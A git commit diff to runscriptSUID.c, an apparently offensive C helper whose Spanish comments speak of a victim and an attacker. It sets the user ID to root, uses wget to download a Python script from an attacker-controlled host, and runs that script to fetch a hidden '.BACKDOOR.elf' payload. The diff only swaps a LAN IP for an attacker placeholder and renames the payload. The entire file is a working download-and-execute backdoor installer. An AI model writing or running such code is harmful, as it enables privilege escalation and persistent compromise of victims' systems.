75632f07529ccb52c830fb5158aea4c7b6b53f19
AdrianGomezMartin <33320425+AdrianGomezMartin@users.noreply.github.com>
2021-06-24 13:21:03 +0000

    Update runscriptSUID.c

--- runscriptSUID.c
+++ runscriptSUID.c
@@ -6,8 +6,8 @@
 int main(){
   setuid(0);
   // DESCARGA SCRIPT , ASIGNA LA DIRECCION DEL SERVIDOR WEB DONDE SE ALOJA EL SCRIPT
-  system("wget http://192.168.1.28/setuid_victima.py");
+  system("wget http://DIRECCION_ATACANTE/setuid_victima.py");
   // PON EL NOMBRE DEL EJECUTABLE Y LA IP O EL DOMINIO AL QUE DESEA CONECTAR PARA SU DESCARGA
-  system("python3 setuid_victima.py -r 192.168.1.28 -e .mi_prueba.elf");
+  system("python3 setuid_victima.py -r 192.168.1.28 -e .BACKDOOR.elf");
   return 0;
 }
